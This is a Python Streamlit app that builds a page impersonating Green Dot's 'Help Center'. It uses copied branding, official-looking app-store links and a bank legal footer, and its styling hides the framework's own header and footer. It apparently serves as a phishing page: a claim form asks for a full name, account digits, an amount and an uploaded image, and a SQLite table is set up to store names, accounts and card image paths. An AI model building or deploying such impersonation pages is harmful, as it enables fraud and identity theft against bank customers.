
import streamlit as st
import sqlite3
import os
import pandas as pd
from datetime import datetime

# Configuración de Rutas
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# CSS PARA CENTRADO Y ESTILO DE FOOTER
st.markdown("""<style>
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .block-container { max-width: 500px !important; padding-top: 2rem !important; }
    header, footer, .stDeployButton, [data-testid='stHeader'] { display: none !important; }

    [data-testid="stImage"] {
        display: block !important;
        margin-left: auto !important;
        margin-right: auto !important;
        text-align: center !important;
    }

    [data-testid="stImage"] img {
        display: inline-block !important;
        width: 250px !important;
        height: auto !important;
    }

    @media (max-width: 768px) {
        [data-testid="stImage"] img { width: 180px !important; }
    }

    .stButton > button { background-color: #00a05b !important; color: white !important; width: 100%; border: none; height: 50px; border-radius: 8px; }
    
    .promo-box {
        background-color: #111; padding: 25px 15px; text-align: center;
        border-radius: 12px; margin: 25px 0; border: 1px solid #222;
    }

    .legal-container {
        font-size: 11px !important;
        color: #777 !important;
        text-align: center !important;
        margin-top: 40px !important;
        padding: 20px 10px !important;
        border-top: 1px solid #222 !important;
        line-height: 1.6 !important;
    }
</style>""", unsafe_allow_html=True)

if os.path.exists("logo.svg"):
    st.image("logo.svg")

st.title("Help Center")
st.write("Please fill out the form below to submit your claim.")

with st.form("claim_v1_final", clear_on_submit=True):
    st.text_input("Full Name")
    st.text_input("Last 4 digits of Account")
    st.number_input("Amount", min_value=0.0)
    st.file_uploader("Evidence", type=["jpg","png"])
    if st.form_submit_button("SUBMIT NOW"):
        st.success("Claim Received.")

# SECCIÓN DOWNLOAD APP
st.markdown("""<div class='promo-box'>
    <h3 style='color:white; margin-bottom:15px; font-size: 1.2rem;'>Download the Green Dot app</h3>
    <div style='display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;'>
        <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'></a>
        <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'></a>
    </div>
</div>""", unsafe_allow_html=True)

# FOOTER LEGAL
st.markdown("<div class='legal-container'>Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924.</div>", unsafe_allow_html=True)
